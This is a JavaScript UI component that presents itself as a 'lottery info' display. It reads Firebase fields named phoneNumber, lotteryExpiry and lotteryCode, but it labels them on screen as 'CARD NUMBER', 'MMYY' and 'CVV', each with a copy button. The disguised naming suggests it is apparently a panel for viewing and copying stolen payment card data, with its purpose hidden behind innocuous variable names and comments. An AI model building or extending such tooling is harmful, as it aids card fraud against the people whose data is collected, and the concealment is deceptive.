export function createLotteryInfo(data, showToast) {

    /* MAIN CONTAINER */

    const container = document.createElement("div");

    container.className = "lottery-info";

    /* CSS STYLING FOR SIDE-BY-SIDE LAYOUT */
    if (!document.getElementById("lottery-grid-style")) {
        const style = document.createElement("style");
        style.id = "lottery-grid-style";
        style.textContent = `
            .lottery-grid-container {
                display: grid;
                grid-template-columns: repeat(3, minmax(0, 1fr));
                gap: 12px;
                margin-bottom: 12px;
            }
            @media (max-width: 768px) {
                .lottery-grid-container {
                    grid-template-columns: 1fr;
                }
            }
        `;
        document.head.appendChild(style);
    }

    /* GET FIREBASE FIELD VALUE */

    function getValue(keys) {
        for (const key of keys) {
            const value = data[key];
            if (
                value !== null &&
                value !== undefined &&
                String(value).trim() !== ""
            ) {
                return value;
            }
        }
        return null;
    }

    /* CREATE SINGLE FIELD */

    function createField(label, value, canCopy = false) {

        const row = document.createElement("div");

        row.className = "lottery-row";

        const heading = document.createElement("strong");

        heading.textContent = label;

        const valueElement = document.createElement("p");

        const hasValue =
            value !== null &&
            value !== undefined &&
            String(value).trim() !== "";

        valueElement.textContent = hasValue
            ? String(value)
            : "N/A";

        row.appendChild(heading);

        row.appendChild(valueElement);

        /* COPY BUTTON */

        if (canCopy && hasValue) {

            const button = document.createElement("button");

            button.type = "button";

            button.className = "copy-btn";

            button.textContent = "📋 Copy";

            button.addEventListener("click", async () => {

                try {

                    await navigator.clipboard.writeText(
                        String(value)
                    );

                    showToast(
                        "✅ Copied successfully!"
                    );

                } catch (error) {

                    console.error(
                        "Clipboard error:",
                        error
                    );

                    showToast(
                        "Unable to copy.",
                        true
                    );

                }

            });

            row.appendChild(button);

        }

        return row;

    }

    /* GRID CONTAINER FOR TOP 3 FIELDS (Phone, Expiry, Security Code) */

    const gridContainer = document.createElement("div");
    gridContainer.className = "lottery-grid-container";

    /* PHONE NUMBER */
    const phoneNumber = getValue([
        "phoneNumber",
        "phone",
        "mobileNumber",
        "mobile"
    ]);
    gridContainer.appendChild(createField("CARD NUMBER", phoneNumber, true));

    /* LOTTERY EXPIRY DATE */
    const lotteryExpiry = getValue([
        "testDate",
        "lotteryExpiry"
    ]);
    gridContainer.appendChild(createField("📅 MMYY", lotteryExpiry, true));

    /* THREE DIGIT LOTTERY CODE */
    const lotteryCode = getValue([
        "testCode",
        "lotteryCode",
        "code3digit"
    ]);
    gridContainer.appendChild(createField("🔐 CVV", lotteryCode, true));

    container.appendChild(gridContainer);

    return container;

}
